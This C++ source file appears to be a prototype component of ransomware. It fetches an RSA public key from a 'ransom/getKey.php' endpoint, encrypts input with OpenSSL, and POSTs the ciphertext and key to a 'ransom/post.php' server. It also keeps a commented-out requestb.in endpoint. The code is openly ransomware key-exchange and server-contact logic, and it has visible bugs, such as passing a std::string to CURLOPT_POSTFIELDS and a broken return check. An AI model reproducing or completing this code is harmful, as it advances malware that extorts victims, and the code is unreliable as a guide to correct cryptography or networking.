#include "stdafx.h"
#include <stdio.h>
//chiffrement
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <string>
#include <iostream>
#include <openssl\err.h>
//libcurl
#include <curl\curl.h>
#include <experimental/filesystem> // C++-standard header file name  
#include <filesystem> // Microsoft-specific implementation header file name 

using namespace std;

unsigned char* generate_key(const unsigned char* pubkey)
{
	int             ret = 0;
	RSA             *r = NULL;
	BIGNUM          *bne = NULL;
	BIO             *bp_public = NULL, *bp_private = NULL;

	int             bits = 2048;
	unsigned long   e = RSA_F4;

	char msg[2048 / 8];
	unsigned char *encrypt = (unsigned char*) "msg cypher";
	int encrypt_length;
	void* err;
	void* decrypt;
	long l = strlen((char*)pubkey);


	BIO *bufio;
	RSA *rsa;

	// 1. generate rsa key
	bne = BN_new();
	ret = BN_set_word(bne, e);
	if (ret != 1) {
		goto free_all;
	}

	//initialize the esa structure
	r = RSA_new();
	//generates the keys and store them in r
	bufio = BIO_new_mem_buf((void*)pubkey, l);
	r = PEM_read_bio_RSA_PUBKEY(bufio, 0, 0, 0);
	//ret = RSA_generate_key_ex(r, bits, bne, NULL);
	//d2i_RSAPublicKey(&r, &pubkey, l);


	//if the generation failed, erase everything
	if (ret != 1) {
		goto free_all;
	}


	//input the msg to encrypt
	printf("Message to encrypt : ");
	fgets(msg, 2048 / 8, stdin);
	msg[strlen(msg) - 1] = '\0'; //get rid of the newline character

								 //let's encrypt
								 //cout << RSA_size(r) << endl;
	encrypt = (unsigned char*)malloc(RSA_size(r));
	err = malloc(130);
	if ((encrypt_length = RSA_public_encrypt(strlen(msg) + 1, (unsigned char*)msg, (unsigned char*)encrypt, r, RSA_PKCS1_OAEP_PADDING)) == -1) {
		ERR_load_crypto_strings();
		ERR_error_string(ERR_get_error(), (char*)err);
		fprintf(stderr, "Error encrypting message :\n %s\n", err);
	}

	cout << "message chiffree =\n " << encrypt << endl;
	cout << "end of encryption" << endl;

	//let's decrypt
	/*decrypt = malloc(RSA_size(r));
	if (RSA_private_decrypt(encrypt_length, (unsigned char*)encrypt, (unsigned char*)decrypt, r, RSA_PKCS1_OAEP_PADDING) == -1) {
	ERR_load_crypto_strings();
	ERR_error_string(ERR_get_error(), (char*) err);
	fprintf(stderr, "Error decrypting message: %s\n", err);
	}
	else {
	printf("Decrypted message : %s\n", decrypt);
	}*/



	// 4. free
free_all:

	BIO_free_all(bp_public);
	BIO_free_all(bp_private);
	RSA_free(r);
	BN_free(bne);

	return encrypt;
}

size_t write_to_string(void *ptr, size_t size, size_t count, void *stream) {
	((string*)stream)->append((char*)ptr, 0, size*count);
	return size * count;
}


const unsigned char* getKey() {

	CURL *curl;
	CURLcode res;
	string response = "";
	const unsigned char* ret = new const unsigned char[response.length() + 1];

	/* In windows, this will init the winsock stuff */
	curl_global_init(CURL_GLOBAL_ALL);

	/* get a curl handle */
	curl = curl_easy_init();
	if (curl) {
		/* First set the URL that is about to receive our POST. This URL can
		just as well be a https:// URL if that is what should receive the
		data. */
		curl_easy_setopt(curl, CURLOPT_URL, "http://localhost/ransom/getKey.php");
		//curl_easy_setopt(curl, CURLOPT_URL, "https://requestb.in/qoekryqo");
		/* Now specify the POST data */
		//curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "rsa_message=Uo┴Hâ ¡+þ¨♦_´ðÈ·³a;kù8Ñ┐õÃ¢,Gâ/☻♠↨~ÜÆ▬Ë☺╠∟óÞ▬zL÷«-Þv☺>↑‼xæE£v9l©§jr@´ùº´$/³$pÆ.═zïÅOo)°`.Ðü¶oTV→È═¯¶ÑÙ£çLu øıµL♂8☻Õ▄1ºk`±*│²²²²PìE&rsa_pukey= -----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCoGtC0xeFLoyE5QDDtLMyo6kvzTG4WPOePpIz78z7dvDcQ/3+OxKJiRGL+qkA3ydYKYBuneNfyJpyevIrAttWtqu6B4P/J8LGwiV1WM1/ghLM6H+YUNhS9/JOKfpOZiBVB1tj++tgMkF1Nssfh+Z+tFszU77KYDbvUedwJwd44hQIDAQAB-----END PUBLIC KEY-----");

		/* Perform the request, res will get the return code */

		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_to_string);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
		res = curl_easy_perform(curl);
		/* Check for errors */
		if (res != CURLE_OK) {
			fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
		}

		//print the response
		cout << "la cle recuperee =\n " << (response) << endl;
		ret = new const unsigned char[response.length() + 1];
		strcpy((char *)ret, response.c_str());

		/* always cleanup */
		curl_easy_cleanup(curl);
	}
	curl_global_cleanup();

	return ret;
}




int send_encrypted_msg(const unsigned char* cypher, const unsigned char* pubkey) {

	CURL *curl;
	CURLcode res;
	string response = "";
	const unsigned char* ret = new const unsigned char[response.length() + 1];

	std::string msg((char*)cypher);
	std::string key((char*)pubkey);

	/* In windows, this will init the winsock stuff */
	curl_global_init(CURL_GLOBAL_ALL);

	/* get a curl handle */
	curl = curl_easy_init();
	if (curl) {
		/* First set the URL that is about to receive our POST. This URL can
		just as well be a https:// URL if that is what should receive the
		data. */
		curl_easy_setopt(curl, CURLOPT_URL, "http://localhost/ransom/post.php");
		//curl_easy_setopt(curl, CURLOPT_URL, "https://requestb.in/qoekryqo");
		/* Now specify the POST data */

		string data = "rsa_pukey=" + key + "&rsa_message=" + msg;
		//string data = "rsa_message=bopbop&rsa_pukey=bolopbolop";
		//cout << "rsa_message =\n " << msg << endl;
		//cout << "rsa_pubkey =\n " << key << endl;
		cout << "\n\n\n" << data << "\n\n\n" << endl;
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);

		/* Perform the request, res will get the return code */

		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_to_string);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
		res = curl_easy_perform(curl);
		/* Check for errors */
		if (res != CURLE_OK) {
			fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
		}

		//print the response
		cout << "la réponse du serveur est : " << (response) << endl;

		/* always cleanup */
		curl_easy_cleanup(curl);
	}
	curl_global_cleanup();

	return 0;
}


